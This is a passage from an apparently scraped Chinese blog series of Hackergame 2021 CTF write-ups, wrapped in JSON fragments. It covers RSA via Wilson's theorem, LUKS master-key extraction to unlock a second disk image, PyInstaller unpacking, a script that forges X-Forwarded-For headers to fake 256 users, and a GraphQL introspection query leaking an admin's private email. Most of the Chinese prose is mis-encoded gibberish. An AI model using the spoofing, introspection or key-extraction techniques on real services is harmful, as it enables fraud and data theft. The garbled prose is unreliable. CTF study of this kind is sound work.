æº¢å‡ºçš„é—®é¢˜ï¼Œä»¥åŠ get_q() ä¸­ q æ˜¯å“ªä¸ªéšæœºçš„512ä½è´¨æ•°çš„é—®é¢˜ get_pä»£ç é‡Œä¹Ÿç»™äº† Hintï¼Œè§‚å¯Ÿ x å’Œ y çš„ç‰¹å¾ã€‚x å’Œ y éƒ½å¾ˆå¤§ï¼Œä½†æ˜¯ä¸¤ä¸ªçš„å·®å¹¶ä¸å¤§ï¼›è€Œä¸”å¯ä»¥ä¸¢åˆ° python é‡ŒéªŒè¯å‡º x æ˜¯ä¸€ä¸ªè´¨æ•°æ‰€ä»¥å¯ä»¥ä½¿ç”¨å¨å°”é€Šå®šç†ä¹ŸæŸ¥åˆ°äº†å¨å°”é€Šå®šç†åœ¨ RSA é¢˜ç›®ä¸­çš„åº”ç”¨ï¼šBUU-RSA [RoarCTF2019]babyRSA è¦æ±‚ y! % xï¼ˆxæ˜¯è´¨æ•°ï¼‰æ ¹æ®å¨å°”é€Šå®šç†ï¼Œæœ‰ $$(x - 1)! \\equiv -1\\pmod{x}$$ æ‰€ä»¥ï¼š $$y!\\times \\frac{(x - 1)!}{y!}\\equiv -1\\pmod{x}$$ ä»¤ $k = \\dfrac{(x - 1)!}{y!} = (y+1)(y+2)â€¦(x-1)x$ ï¼Œæ‰€ä»¥æœ‰ï¼š $$y!\\equiv -\\mathrm{inv}(k, x)\\pmod{x}$$ ï¼ˆå…¶ä¸­ $\\mathrm{inv}(k, x)$ è¡¨ç¤ºæ¨¡ x ä¸‹ k çš„é€†å…ƒï¼‰æ‰€ä»¥é‡å†™ get_p() å³å¯æ­£ç¡®çš„å¾—åˆ° pï¼š 12345678def get_p(): x = ... y = ... k = 1 for i in range(y + 1, x): k = (k * i) % x res = (-gmpy2.invert(k, x)) % x return sympy.nextprime(res) get_qç›¸æ¯”æ¥è¯´ï¼Œget_q å°±æ²¡é‚£ä¹ˆéœ€è¦æŠ€å·§äº†ç»™å‡ºäº† value[-1] çš„å€¼ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨ sympy.prevprime é€†æ¨å‡ºæ•´ä¸ª value æ•°ç»„ 1234value = [80096058210213458444437404275177554701604739094679033012396452382975889905967]for i in range(1, 10): value.append(sympy.prevprime(value[i - 1]))print(&quot;value[-1] = &quot;, value[-1]) åé¢è®¡ç®— value_q ç»†çœ‹å…¶å®ä¹Ÿæ˜¯ä¸€ä¸ª RSA ç®—æ³•ï¼š qï¼šå¯†æ–‡ eï¼šç§é’¥ value_qï¼šæ˜æ–‡ nï¼šå°±æ˜¯ nï¼Œåªä¸è¿‡ä¸æ˜¯ä¸¤ä¸ªè´¨æ•°ç›¸ä¹˜ï¼Œæ˜¯åä¸ªè´¨æ•°ç›¸ä¹˜ åä¸ªè´¨æ•°ç›¸ä¹˜å¾—åˆ° n çš„ RSA ç®—æ³•ä¹Ÿä¸€æ ·ï¼Œå› ä¸º RSA çš„æ­£ç¡®æ€§å¹¶æ²¡æœ‰è¦æ±‚ n ä¸€å®šæ˜¯ä¸¤ä¸ªå¤§è´¨æ•°ç›¸ä¹˜ï¼Œè¿™æ ·åªæ˜¯éš¾ä»¥ç ´è§£ä¿è¯å®‰å…¨æ€§è§£å†³è¿™ä¸ªåŒæ ·ä¹Ÿæ˜¯éœ€è¦å…¬é’¥ dï¼Œæ‰€ä»¥éœ€è¦ phi(n)æ ¹æ®æ¬§æ‹‰å‡½æ•°çš„æ€§è´¨ï¼Œphi(n) ç­‰äº n çš„æ‰€æœ‰è´¨å› æ•°å‡ä¸€çš„ç§¯å³ phi(n) = (value[0] - 1) * (value[1] - 1) * â€¦ * (value[9] - 1) å†è§£å¯†å³å¯å¾—åˆ°å¯†æ–‡ qï¼Œç„¶åä¹Ÿå°±å¾—åˆ°äº† get_q çš„ç»“æœ 123456789n = phi = 1for i in range(10): n = n * value[i] phi *= (value[i] - 1)value_q = ...d = pow(e, -1, phi) q = pow(value_q, d, n)return sympy.nextprime(q) flagæå®šäº† get_p å’Œ get_q ä¹‹åå°±å¯ä»¥ç›´æ¥è§£å‡º flag äº†ï¼š 123456789e = 65537p = get_p()q = get_q()c = ...d = pow(e, -1, (p-1) * (q-1))m = pow(c, d, p * q)print(int.to_bytes(m, 30, byteorder=&quot;big&quot;)) åŠ å¯†çš„ U ç›˜ï¼ˆæœ¬æ¥æŒºå¥½åšçš„ä¸€é“é¢˜ï¼Œæ€ä¹ˆé¢˜ç»™çš„æç¤ºæˆ‘å°±ç¡¬æ˜¯æ²¡é¢†ä¼šåˆ°ï¼‰ è¿™æ˜¯ä¸€ä¸ªå…³äº LUKS (Linux Unified Key Setup) çš„æ•…äº‹ã€‚ ç¬¬ä¸€å¤©å° Tï¼šã€Œä½ è¦çš„éšæœºè¿‡ç¨‹çš„è¯¾ä»¶æˆ‘å¸®ä½ æ‹·å¥½äº†ï¼Œåœ¨è¿™ä¸ª U ç›˜é‡Œï¼ŒLUKS åŠ å¯†çš„å¯†ç æ˜¯ suijiguocheng123123ã€‚ã€å° Zï¼šã€Œå•Šï¼Œä½ åˆæäº† Linux æ–‡ä»¶ç³»ç»ŸåŠ å¯†ï¼ŒçœŸæ‹¿ä½ æ²¡åŠæ³•ã€‚æˆ‘ç°åœ¨ä¸æ–¹ä¾¿ç”¨ Linuxï¼Œæˆ‘ç›´æ¥æŠŠè¿™å—ç›˜åšæˆç£ç›˜é•œåƒæ–‡ä»¶å†å›å»å¤„ç†å§ã€‚ã€ ç¬¬äºŒå¤©å° Zï¼šã€Œè°¢è°¢ä½ æ˜¨å¤©å¸®æˆ‘æ‹·çš„è¯¾ä»¶ã€‚ä½ æ¯æ¬¡éƒ½æè¿™ä¸ªåŠ å¯†ï¼Œå®ƒçœŸçš„å®‰å…¨å—ï¼Ÿã€å° Tï¼šã€Œå½“ç„¶äº†ï¼ä½ çœ‹ï¼Œä½ è¿˜ç»™æˆ‘ä¹‹åï¼Œæˆ‘å·²ç»æŠŠè¿™å—ç›˜çš„å¼±å¯†ç æ”¹æ‰äº†ï¼Œç°åœ¨æ˜¯éšæœºç”Ÿæˆçš„å¼ºå¯†ç ï¼Œè¿™æ ·é™¤äº†æˆ‘è‡ªå·±ï¼Œä¸–ç•Œä¸Šä»»ä½•äººéƒ½æ— æ³•è§£å¯†å®ƒäº†ã€‚ã€å° Zï¼šã€Œæˆ‘å¯ä¸ä¿¡ã€‚ã€å° Tï¼šã€Œä½ ä¸ä¿¡ï¼Ÿä½ çœ‹ï¼Œæˆ‘ç°åœ¨å¾€ U ç›˜é‡Œæ”¾ä¸€ä¸ª flag æ–‡ä»¶ï¼Œç„¶åè¿™ä¸ª U ç›˜å°±ç»™ä½ äº†ï¼Œä½ ç»å¯¹è§£å¯†ä¸å‡ºæ¥è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚å½“åˆæ LUKS çš„æ—¶å€™æˆ‘å¯ç ”ç©¶äº†å¥½å‡ å¤©ï¼Œç­ä¸Šå¯æ²¡äººæ¯”æˆ‘æ›´æ‡‚åŠ å¯†ï¼ã€ ä¸€å…±ç»™äº†ä¸¤ä¸ª img æ–‡ä»¶ï¼Œé€šè¿‡ file å¯ä»¥çœ‹å‡ºéƒ½æ˜¯ DOS/MBR boot sector 123$ file *.img day1.img: DOS/MBR boot sector; partition 1 : ID=0xee, start-CHS (0x0,0,2), end-CHS (0x3ff,255,63), startsector 1, 40959 sectors, extended partition table (last)day2.img: DOS/MBR boot sector; partition 1 : ID=0xee, start-CHS (0x0,0,2), end-CHS (0x3ff,255,63), startsector 1, 40959 sectors, extended partition table (last) æ‰€ä»¥å…ˆç›´æ¥ 7z æå–ï¼Œå¾—åˆ°ä¸¤ä¸ªæ–°çš„ imgï¼Œå† fileï¼š 123$ file *.img My Disk.img: LUKS encrypted file, ver 2 [, , sha256] UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998My Disk 2.img: LUKS encrypted file, ver 2 [, , sha256] UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998 å‘ç°éƒ½æ˜¯ LUKS encrypted file åœ¨ Kali Linux é‡Œå°è¯•ç›´æ¥æŒ‚è½½ç¬¬ä¸€ä¸ª imgï¼Œè¦æ±‚è¾“å…¥å¯†ç ï¼ŒæŠŠé¢˜ç»™çš„å¯†ç è¾“å…¥å°±å¯ä»¥çœ‹åˆ° â€œè¯¾ä»¶â€ ä»¥ä¸Šéƒ½æ˜¯å·²çŸ¥çš„è¯•éªŒéƒ¨åˆ†ï¼ŒçœŸæ­£è¦åšçš„æ˜¯è§£å¼€ç¬¬äºŒä¸ªæœªçŸ¥å¯†ç çš„ LUKS imgå·²çŸ¥ç£ç›˜çš„åŠ å¯†ä½¿ç”¨çš„æ˜¯ luks2ï¼Œåœ¨ç½‘ä¸ŠæŸ¥äº†ç ´è§£ luks2 ä¹‹ç±»çš„éƒ½è¯´ luks2 ä¸å¯ç ´è§£ï¼Œæˆ–è€…æ˜¯ä½¿ç”¨å·²çŸ¥çš„å¯†ç å­—å…¸æ¥çˆ†ç ´ä½†æ˜¯é¢˜é‡Œè¯´äº† â€œéšæœºç”Ÿæˆçš„å¼ºå¯†ç â€ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯æ²¡æœ‰å¯†ç å­—å…¸çš„ å…¶å®è¿™é“é¢˜çš„æœ€å¤§æç¤ºå°±åœ¨äºå®ƒç»™äº†ä¸¤ä¸ª imgï¼Œæ—¢ç„¶ç¬¬ä¸€ä¸ª img æ‰“å¼€åä»…ä»…æ˜¯ä¸€ä¸ªè¯¾ä»¶ï¼Œå¦‚æœå®ƒçš„ç”¨å¤„ä»…ä»…æ˜¯ç”¨æ¥è¯•éªŒ luks æ€ä¹ˆæ‰“å¼€çš„è¯ï¼Œæ ¹æœ¬å®ƒæ²¡å¿…è¦ç»™å‡ºæ‰€ä»¥ç¬¬ä¸€ä¸ª img è‚¯å®šè¿˜æ˜¯æœ‰ç”¨çš„ã€‚ å†çœ‹é¢˜ç›®ï¼Œåå¤è¯´äº† U ç›˜ï¼Œæ‰€ä»¥è¿™ä¸¤ä¸ª img åº”è¯¥æ˜¯åŒä¸€ä¸ª U ç›˜çš„é•œåƒæ–‡ä»¶ï¼Œåªæ˜¯æ›´æ”¹äº†å¯†ç è€Œå·²ï¼ˆfile çœ‹åˆ°çš„ uuid ä¹Ÿæ˜¯ä¸€è‡´çš„ï¼‰äºæ˜¯ç»§ç»­å¿…åº”ï¼Œå‘ç°åŒä¸€ä¸ªç£ç›˜çš„ master-key æ˜¯ä¸€æ ·çš„ï¼Œè€Œä¸”å¯ä»¥ç”¨ master-key æ¥æ·»åŠ å¯†ç æ¢å¤ç£ç›˜ï¼ˆè§ï¼š10 Linux cryptsetup Examples for LUKS Key Managementï¼‰ æ‰€ä»¥å°±è·Ÿç€æ–‡ç« é‡Œçš„åšæ³•ï¼Œä»ç¬¬ä¸€ä¸ª img ä¸­æå–å‡º master-keyï¼Œç„¶åç”¨å®ƒæ¥æä¾› AddKey çš„æƒé™ã€‚æ·»åŠ äº†æ–° passphrase åå°±å¯ä»¥ç”¨æ–°å¯†ç æ‰“å¼€ç£ç›˜äº†ï¼š 1234567891011$ cryptsetup luksDump --dump-master-key MyDisk.img # è¾“å‡º master-key...MK dump: be 97 db 91 5c 30 47 ce 1c 59 c5 c0 8c 75 3c 40 72 35 85 9d fe 49 c0 52 c4 f5 26 60 af 3e d4 2c ec a3 60 53 aa 96 70 4d f3 f2 ff 56 8f 49 a1 82 60 18 7c 58 d7 6a ec e8 00 c1 90 c1 88 43 f8 9a$ cat &quot;be...9a&quot; &gt; master_key.txt # å­˜å…¥æ–‡ä»¶$ xxd -r -p master_key.txt master_key.bin # è½¬ä¸ºäºŒè¿›åˆ¶$ cryptsetup luksAddKey MyDisk2.img --master-key-file &lt;(cat master_key.bin) # æ·»åŠ å¯†ç Enter new passphrase for key slot: # è¾“å…¥æ–°å¯†ç å³å¯ï¼Œå› ä¸ºmaster-key-fileç›¸å½“äºæä¾›äº†åŸå§‹å¯†ç Verify passphrase: ï¼ˆä¸€å®šè¦ç”¨ root æƒé™æ‰å¯ä»¥åŠ å¯†ç ï¼‰ç„¶åæŒ‚è½½ã€è¾“å…¥å¯†ç ï¼Œå°±å¯ä»¥çœ‹åˆ° flag.txt äº† Micro World å®‡å®™ä¸­æŸä¸€ç‰‡æå…¶å¾®å°çš„åŒºåŸŸé‡Œçš„ç²’å­è¢«ä¸€è‚¡ç¥ç§˜åŠ›é‡åˆå§‹åŒ–è®¾ç½®æˆäº† flag çš„å½¢çŠ¶ï¼Œç¨‹åºå¿ å®åœ°è®°å½•äº†ä¸€æ®µæ—¶é—´ä¹‹åè¿™ç‰‡åŒºåŸŸçš„ç²’å­è¿åŠ¨æƒ…å†µã€‚ æ‹¿åˆ°äº† exe æ–‡ä»¶ï¼Œçœ‹èµ·æ¥æŒºç²¾è‡´ï¼Œè¿è¡Œèµ·æ¥æ˜¯ä¸€äº›ç‚¹è¿åŠ¨ç¢°æ’çš„åœºæ™¯æ‹–åˆ° IDA é‡Œçœ‹çœ‹ï¼Œå‘ç°äº† __main__ ä»¥åŠ .rdata é‡Œä¸€äº› py æœ‰å…³çš„å­—ç¬¦ä¸²ï¼šæ‰€ä»¥æ¨æµ‹æ˜¯ä½¿ç”¨ python ç¼–å†™çš„ï¼Œç„¶åç”¨ pyinstaller æ‰“åŒ… è¿™æ ·çš„è¯è¯•ç€ç”¨ pyinstxtractor è§£åŒ… .exeï¼ŒæˆåŠŸå¾—åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹é‡Œé¢æ˜¯ä¸€å † .pyc .pyd .dll æ–‡ä»¶ï¼Œä»åå­—å°±å¯ä»¥çœ‹å‡ºå¤§éƒ¨åˆ†æ˜¯ import çš„åŒ…ï¼Œåªæœ‰ä¸€ä¸ªç‰¹åˆ«çš„ 2.pycæ‰€ä»¥è¿™ä¸ªåº”è¯¥å°±æ˜¯ç¼–è¯‘åçš„æºç äº† æ¥ä¸‹æ¥ç”¨ uncompyle6 æ¥åç¼–è¯‘ pyc æ–‡ä»¶ï¼Œè¾“å‡ºå¾—åˆ°äº†æºç  2.pyå°è¯•è¿è¡Œï¼Œå‘ç°è·‘èµ·æ¥ä¹‹ååªæœ‰ä¸€ä¸ªç‚¹åœ¨è¿åŠ¨ï¼Œåº”è¯¥æ˜¯åç¼–è¯‘æ—¶å‡ºäº†äº›é—®é¢˜äºæ˜¯å¼€å§‹çœ‹æºç  åŸºæœ¬ä¸Šç®€å•è¯´å°±æ˜¯ï¼Œåˆå§‹æœ‰ä¸€äº›æ•°æ®ï¼Œè¡¨ç¤ºæ¯ä¸ªç‚¹çš„ä½ç½®å’Œé€Ÿåº¦ï¼Œç„¶åè¿è¡Œï¼Œæ¯æ¬¡è¿è¡Œéƒ½æ£€æµ‹ç¢°æ’ï¼Œç„¶åè·å¾—æ–°çš„ç‚¹ä½ç½®ï¼Œå†ç»˜åˆ¶å‡ºæ¥è°ƒè¯•ä¸€ä¸‹ï¼Œè¾“å‡ºæ¯æ¬¡çš„ pointlistï¼Œå‘ç°ç¬¬ä¸€æ¬¡æ˜¯æ‰€æœ‰ç‚¹ï¼Œç¬¬äºŒæ¬¡å˜æˆ2ä¸ªï¼Œç¬¬ä¸‰æ¬¡å¾€åå°±åªæœ‰ä¸€ä¸ªäº†æ‰€ä»¥é—®é¢˜å¤§æ¦‚å°±å‡ºåœ¨äº† next_pos_list å‡½æ•°ï¼š 12345678910111213141516171819def next_pos_list(Pointlist): pointlist = [] for i in range(len(Pointlist)): for point in Pointlist[i + 1:]: times = checkcrush(Pointlist[i], point) if times != None: a, b = get_new_point(times, Pointlist[i], point) pointlist.extend([a, b]) Pointlist[i].flag = 0 point.flag = 0 else: for item in Pointlist: if item.flag != 0: pointlist.append(Point((item.x + item.vx, item.y + item.vy), item.vx, item.vy)) for poi in pointlist: poi.x = poi.x % WIDTH poi.y = poi.y % HEIGHT else: return pointlist ä»”ç»†è¯»ä¸€è¯»ï¼Œå¯ä»¥å‘ç°è¿™é‡Œé¢çš„ for-else å—å¾ˆå¥‡æ€ªï¼Œå¯¼è‡´å¾ªç¯ç»“æŸå’Œ return éƒ½æ—©äº†ï¼Œæ‰€ä»¥æ ¹æ®å‡½æ•°çš„æ„æ€æ”¹ä¸€æ”¹ï¼š 12345678def next_pos_list(Pointlist): pointlist = [] for i in range(len(Pointlist)): for point in Pointlist[i + 1:]: ... for item in Pointlist: ... return pointlist è¿™æ ·å°±å¯ä»¥æˆåŠŸè¿è¡Œäº† ä½†æ˜¯ç”»é¢ä»ç„¶æ˜¯æ‚ä¹±çš„ã€‚å› ä¸ºé¢˜é‡Œè¯´äº† â€œè®°å½•äº†ä¸€æ®µæ—¶é—´ä¹‹åè¿™ç‰‡åŒºåŸŸçš„ç²’å­è¿åŠ¨æƒ…å†µâ€æ‰€ä»¥éœ€è¦å°†è½¨è¿¹å¾€å‰æ¨ï¼Œæœ€æ–¹ä¾¿çš„æ–¹æ³•å°±æ˜¯æ›´æ”¹æ¯ä¸ªç‚¹çš„é€Ÿåº¦æ–¹å‘ï¼š 123Pointlist = []for item in list_: Pointlist.append(Point((item[0], item[1]), -item[2], -item[3])) è¿è¡Œåç­‰å¾…ä¸€å°ä¼šå„¿å°±å¯ä»¥çœ‹åˆ°ç‚¹é€æ¸æœ‰åºï¼Œåœ¨æŸä¸€åˆ»æ±‡æˆäº† flagï¼šè™½ç„¶ä¸å¤ªæ¸…æ™°ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥çŒœä¸ªå¤§æ¦‚ åˆå†™äº†è›®é•¿çš„ï¼Œå‰©ä¸‹çš„æ”¾åœ¨ä¸‹ä¸€ç¯‡(:Ğ·ã€âˆ ) Reference Wilsonâ€™s theorem - wikipedia BUU-RSA [RoarCTF2019]babyRSA - CSDN Eulerâ€™s totient function - wikipedia LUKS2 doc pdf 10 Linux cryptsetup Examples for LUKS Key Management pyinstxtractor uncompyle6 &lt; #2 #4 &gt;","link":"/p/f152ab1f.html"},{"title":"ã€ŒHackergame 2021ã€#2 Writup å¼€å±€ä¸Šåˆ†ç¯‡ 1","text":"&lt; #1 #3 &gt; è¿™é‡Œæ¥ä¸Šä¸€ç¯‡ï¼ŒWriteup çš„æœ‰ï¼šå¤§ç åˆ€ã€å›¾ä¹‹ä¸Šã€èµ›åšå¨æˆ¿01ã€åŠ©è®°è¯1ã€pğŸ˜­qæœ‰äº›è™½ç„¶ååã€åˆ†å€¼é«˜ï¼Œä½†æ˜¯æ€»ä½“å¹¶ä¸éš¾ FLAG åŠ©åŠ›å¤§çº¢åŒ… å‚ä¸æ´»åŠ¨ï¼ŒåŠ©åŠ›æŠ½å¥–ï¼é›†æ»¡ 1 ä¸ª flagï¼Œå³å¯æå– 1 ä¸ª flagã€‚ æ­å–œä½ ç§¯æ”’åˆ° 0.5â€¦â€¦ ä¸ª flagï¼Œå‰©ä½™æ—¶é—´ï¼š10åˆ†00ç§’ å·²æœ‰ 0 ä½å¥½å‹ä¸ºæ‚¨åŠ©åŠ›ã€‚ å°†å¦‚ä¸‹é“¾æ¥åˆ†äº«ç»™å¥½å‹ï¼Œå¯ä»¥è·å¾—å¥½å‹åŠ©åŠ›ï¼Œè·å¾—æ›´å¤š flagï¼šâ€¦â€¦ è€å¹¶å¤•å¤•äº†ï¼Œç»è¿‡ä¸€äº›æµ‹è¯•å’Œçœ‹è§„åˆ™å¯ä»¥çŸ¥é“ï¼Œip åœ¨åŒä¸€ /8 ç½‘æ®µçš„ç”¨æˆ·è¢«è§†ä¸ºåŒä¸€ç”¨æˆ·ï¼Œå³ ip åœ°å€çš„ç¬¬ä¸€ä¸ªç‚¹å‰é¢çš„æ•°å­—ä¸ä¸€æ ·æ‰æ˜¯ä¸åŒç”¨æˆ·å†ç”¨è™šæ‹Ÿæœºå’Œæ‰‹æœºè¯•ä¸€ä¸‹ï¼Œå‘ç°æ¯ä¸ªç”¨æˆ·å¢åŠ çš„ flag æ•°é‡å¾ˆå°æ‰€ä»¥æ¨æµ‹éœ€è¦200+ä¸ª ip åœ°å€ï¼Œè‚¯å®šä¸ä¼šè¦çœŸçš„è½¬å‘ï¼Œè€Œä¸”ä¹Ÿå¾ˆéš¾å‡‘å‡ºå¾ˆå¤šä¸åœ¨åŒä¸€ /8 ç½‘æ®µçš„ ip äºæ˜¯åœ¨ BurpSuite é‡Œé¢æŠ“åŒ…å¯ä»¥çœ‹åˆ°ï¼Œæ¯æ¬¡ç‚¹å‡»â€œåŠ©åŠ›â€éƒ½ä¼šå‘é€ä¸€ä¸ªåˆ°åŠ©åŠ›é“¾æ¥çš„ POSTï¼Œå†…å®¹ä¸º ip åœ°å€ç„¶åå°†å…¶å‘é€åˆ° Repeater ä¸­ï¼Œå°è¯•æ›´æ”¹ ip åœ°å€ï¼Œå¾—åˆ°çš„ Response ä¸­è¯´ â€œå¤±è´¥ï¼æ£€æµ‹åˆ°å‰åç«¯æ£€æµ‹ IPv4 åœ°å€ä¸åŒ¹é…â€ æ‰€ä»¥ä»…ä»…æ›´æ”¹ POST å†…å®¹çš„ ip æ˜¯ä¸å¤Ÿçš„ï¼Œè€Œæä¾›ç»™æ£€æµ‹çš„å†…å®¹ä¹Ÿä»…ä»…æ˜¯ä¸€ä¸ª POSTï¼Œæ‰€ä»¥å¯ä»¥æ›´æ”¹ POST å¤´ï¼Œæ·»åŠ  X-Forwarded-Forç„¶åä½¿ç”¨ python å°±å¯ä»¥å¾ªç¯å‘é€ POST å¹¶ä¼ªé€  ip åœ°å€å¾—åˆ°256ä¸ªåŠ©åŠ›äº†ï¼Œåˆšå¥½è¾¾åˆ°1ä¸ªflagï¼šï¼ˆè¦æ³¨æ„ sleep ä¸€æ®µæ—¶é—´ï¼Œä¸ç„¶ä¼šå‡ºç°æ“ä½œè¿‡å¿«æ‹’ç»çš„æƒ…å†µï¼›ä¹Ÿä¸è¦ sleep è¿‡é•¿ï¼Œå¦åˆ™è¶…è¿‡10åˆ†é’Ÿ flag å°±æ— æ•ˆäº†ï¼‰ 1234567891011121314import requests import timefrom tqdm import tqdmurl = &quot;http://202.38.93.111:10888/invite/...&quot;with tqdm(total=256) as pbar: for i in range(256): res = requests.post(url, data={&quot;ip&quot;: f&quot;{i}.0.0.0&quot;}, headers={&quot;X-Forwarded-For&quot;: f&quot;{i}.0.0.0&quot;}) if &quot;æˆåŠŸ&quot; not in res.text: print(&quot;[x] å¤±è´¥&quot;) print(res.text) time.sleep(1.5) pbar.update(1) å›¾ä¹‹ä¸Šçš„ä¿¡æ¯ å° T å¬è¯´ GraphQL æ˜¯ä¸€ç§ç‰¹åˆ«çš„ API è®¾è®¡æ¨¡å¼ï¼Œä¹Ÿæ˜¯ RESTful API çš„æœ‰åŠ›ç«äº‰è€…ï¼Œæ‰€ä»¥ä»–å†™äº†ä¸ªå°ç½‘ç«™æ¥å®éªŒè¿™é¡¹æŠ€æœ¯ã€‚ ä½ èƒ½é€šè¿‡è¿™ä¸ªå…¨æ–°çš„æ¥å£ï¼Œè·å–åˆ°æ²¡æœ‰å…¬å¼€å‡ºæ¥çš„ç®¡ç†å‘˜çš„é‚®ç®±åœ°å€å—ï¼Ÿ é¢˜ç›®ä¿¡æ¯ç»™çš„å¾ˆå……åˆ†ï¼Œç”¨çš„æ˜¯ GraphQLï¼Œè¦ç”¨å…¶å¾—åˆ° admin çš„é‚®ç®± æ²¡æ¥è§¦è¿‡ GraphQLï¼Œæ‰€ä»¥ç›´æ¥å¿…åº”ï¼ˆé€ƒæŸ¥åˆ°äº†å¾ˆå¤šæœ‰ç”¨çš„ä¸œè¥¿ï¼š GraphQLå®˜ç½‘ï¼šäº†è§£ä¸€ä¸‹ GraphQL æ˜¯å¹²ä»€ä¹ˆçš„ï¼Œè¦æ€ä¹ˆç”¨ GraphiQLï¼šä¸€ä¸ªè¿›è¡Œ GraphQL æŸ¥è¯¢çš„ GUI ã€å®‰å…¨è®°å½•ã€‘ç©è½¬GraphQL - DVGAé¶åœºï¼ˆä¸Šï¼‰- çŸ¥ä¹ GraphQL Voyagerï¼šå¯è§†åŒ–ç°å® GraphQL å†…çœå‡ºçš„ç»“æ„ ç®€è€Œè¨€ä¹‹ï¼ŒGraphQL å°±æ˜¯ä¸€ä¸ªå¯ä»¥é€šè¿‡ä¸€æ¬¡ query è¯·æ±‚æŸ¥è¯¢å¤šä¸ªèµ„æºçš„ API æ¨¡å¼ï¼Œåªè¦ ç½‘å€/graphql?query=... å°±å¯ä»¥å®ç°æŸ¥è¯¢æœ‰äº›ä½¿ç”¨ GraphQL çš„ç½‘ç«™å¯ä»¥ç›´æ¥é€šè¿‡è®¿é—® ç½‘å€/graphiql å¾—åˆ°æŸ¥è¯¢çš„ GUIä½†æ˜¯æœ¬é¢˜ä¸­ç¦æ­¢äº†ï¼Œä½†å¯ä»¥ä½¿ç”¨ GraphiQL è½¯ä»¶æ¥è¿›è¡ŒæŸ¥è¯¢ åœ¨ç¬¬ä¸‰ä¸ªé“¾æ¥ä¸­å¯ä»¥äº†è§£åˆ°ï¼Œå¯ä»¥åˆ©ç”¨ GraphQL çš„å†…çœæŸ¥è¯¢æ¥æ³„éœ²å‡ºå†…éƒ¨çš„ç»“æ„ï¼ŒæŠŠå…¶ä¸­çš„æŸ¥è¯¢è¯­å¥ä¸¢åˆ° GraphiQL ä¸­å¯ä»¥å¾—åˆ°ç»“æœ 1query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } }}fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef }}fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue}fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }} ç„¶åæŠŠç»“æœä¸¢åˆ° GraphQL Voyager ä¸­å°±å¯ä»¥å¾—åˆ°å¯è§†åŒ–çš„ç»“æ„ï¼š æ‰€ä»¥åªéœ€è¦æ ¹æ® id query ä¸€ä¸‹ user å°±å¯ä»¥äº†ï¼š 123456789query { user(id: 1) { privateEmail, } }&gt;&gt;&gt; { &quot;data&quot;: { &quot;user&quot;: { &quot;privateEmail&quot;: &quot;flag{...}&quot; } }} èµ›åšå¨æˆ¿ è™½ç„¶è¿™æ˜¯ä½ çš„é¤å…ï¼Œä½†åªæœ‰æœºå™¨äººå¯ä»¥åœ¨å¨æˆ¿å·¥ä½œã€‚æœºå™¨äººç²¾ç¡®åœ°æŒ‰ç…§ç¨‹åºå·¥ä½œï¼Œåœ¨å¨æˆ¿ä¸­ç§»åŠ¨ï¼Œä»ç‰©å“æºå–å‡ºé£Ÿæï¼ŒæŒ‰ç…§èœè°±çš„é¡ºåºæŠŠé£Ÿæä¾æ¬¡æ”¾å…¥é”…å†…ã€‚ æœºå™¨äººä¸éœ€è¦ä¼‘æ¯ï¼Œåªéœ€è¦ä¸€ä¸ªæ™šä¸Šçš„æ—¶é—´æ¥å­¦ä¹ ä½ æ•™ç»™å®ƒçš„ç¨‹åºï¼Œåœ¨æ­¤ä¹‹åä½ å°±å¯ä»¥åœ¨ä»»ä½•æ—¶å€™è®©æœºå™¨äººæ‰§è¡Œè¿™ä¸ªç¨‹åºï¼Œç¨‹åºçš„æ¯ä¸€æ­¥æ‰§è¡Œéƒ½ä¼šè¢«è®°å½•ä¸‹æ¥ï¼Œæ–¹ä¾¿ä½ æ£€æŸ¥æœºå™¨äººåšèœçš„è¿‡ç¨‹ã€‚ å¦å¤–ä¸ºäº†ç¬¦åˆé£Ÿå“å®‰å…¨æ³•çš„è¦æ±‚ï¼Œèµ›åšå¨æˆ¿ä¸­çš„æœºå™¨äººåŒä¸€æ—¶é—´æ‰‹é‡Œåªèƒ½æ‹¿ä¸€ç§é£Ÿç‰©ï¼Œæ¯æ¬¡åšèœå‰éƒ½å¿…é¡»æ‰§è¡Œæ¸…ç†å¨æˆ¿çš„æ“ä½œï¼ŒæŠŠå„å¤„çš„é£Ÿç‰©æ®‹æ¸£æ¸…ç†æ‰ï¼Œç„¶åå›åˆ°å¨æˆ¿è§’è½å¾…å‘½ã€‚ æ¯å¤©çš„èœè°±å¯èƒ½ä¸åŒï¼Œä½†ä¹Ÿè®¸ä¹Ÿå­˜åœ¨ä¸€äº›è§„å¾‹ã€‚ å¯¹æœºå™¨äººç¼–ç¨‹å¯ä»¥ä½¿ç”¨çš„æŒ‡ä»¤æœ‰ï¼ˆn, m ä¸ºæ•´æ•°å‚æ•°ï¼Œç¨‹åºçš„è¡Œå·ä» 0 å¼€å§‹ï¼Œæ³¨æ„æŒ‡ä»¤ä¸­éœ€è¦æ­£ç¡®ä½¿ç”¨ç©ºæ ¼ï¼‰ï¼š å‘ä¸Š n æ­¥å‘ä¸‹ n æ­¥å‘å·¦ n æ­¥å‘å³ n æ­¥æ”¾ä¸‹ n ä¸ªç‰©å“æ‹¿èµ· n ä¸ªç‰©å“æ”¾ä¸‹ç›˜å­æ‹¿èµ·ç›˜å­å¦‚æœæ‰‹ä¸Šçš„ç‰©å“å¤§äºç­‰äº n å‘ä¸Šè·³è½¬ m è¡Œå¦‚æœæ‰‹ä¸Šçš„ç‰©å“å¤§äºç­‰äº n å‘ä¸‹è·³è½¬ m è¡Œ èµ¶ç´§è¿›å…¥èµ›åšå¨æˆ¿å¼€å§‹åšèœå§ï¼ 